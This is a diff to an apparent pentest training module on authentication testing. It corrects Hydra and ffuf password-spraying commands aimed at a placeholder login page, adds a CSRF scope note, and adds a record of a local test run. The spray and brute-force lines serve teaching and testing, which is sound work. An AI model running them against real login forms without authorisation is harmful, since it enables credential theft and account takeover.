@@ -77,15 +77,15 @@ When limits are absent or weak, run a proper password spray or brute force:
 
 ```bash
 # Password spraying: few passwords, many users (quieter and more realistic)
-hydra -L users.txt -P top-passwords.txt https-post-form \
-  "/login:username=^USER^&password=^PASS^:F=Invalid username or password" \
-  -t 10 https://app.example.com
+# hydra takes the target first and the module second: hydra [options] <target> <module> "<params>"
+hydra -L users.txt -P top-passwords.txt -t 10 app.example.com https-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
 
 # ffuf can replay raw requests when hydra syntax gets awkward
 ffuf -u https://app.example.com/login -X POST \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   -d 'username=admin&password=FUZZ' \
-  -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt \
+  -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
   -fs 4242   # filter the "wrong password" page length
 ```
 
@@ -170,7 +170,9 @@ Set-Cookie: JSESSIONID=0A1B2C...; Path=/; HttpOnly; Secure; SameSite=Lax
 
 - **HttpOnly missing** → JavaScript can read the cookie → XSS becomes session theft (Phase 04).
 - **Secure missing** → cookie sent over plain HTTP → sniffable on the network.
-- **SameSite absent/None** → CSRF exposure grows (relevant to later phases).
+- **SameSite absent/None** → CSRF exposure grows. No phase in this module develops
+  CSRF end to end: treat the flag as the finding here and take the attack itself
+  from the OWASP material in *Further Resources*.
 - **No `__Host-`/`__Secure-` prefix** → weaker binding to origin; prefixing is best practice.
 - **Session cookie vs persistent cookie:** long-lived "remember me" cookies widen the theft window; check whether they can be revoked server-side.
 
@@ -211,6 +213,12 @@ curl -s -b 'JSESSIONID=OLDTOKEN' https://app.example.com/account
 - [ ] I tested MFA for skippable steps, missing enforcement, and brute-forceable OTP codes.
 - [ ] I inspected session cookies for HttpOnly, Secure, SameSite, and prefix best practices.
 - [ ] I confirmed logout and password change invalidate the old session.
+
+> **Verification:** executed against Hydra 9.5 on 2026-09-19 against a local listener: the spray
+> line above found the planted credential (`[18080][http-post-form] host: 127.0.0.1 login: admin
+> password: x`), while the previous spelling with `https-post-form` before the host ended in
+> `[ERROR] Unknown service: /login:…`. ffuf was not run against a real login form, so that line
+> remains a syntax reference.
 
 ## Further Resources
 
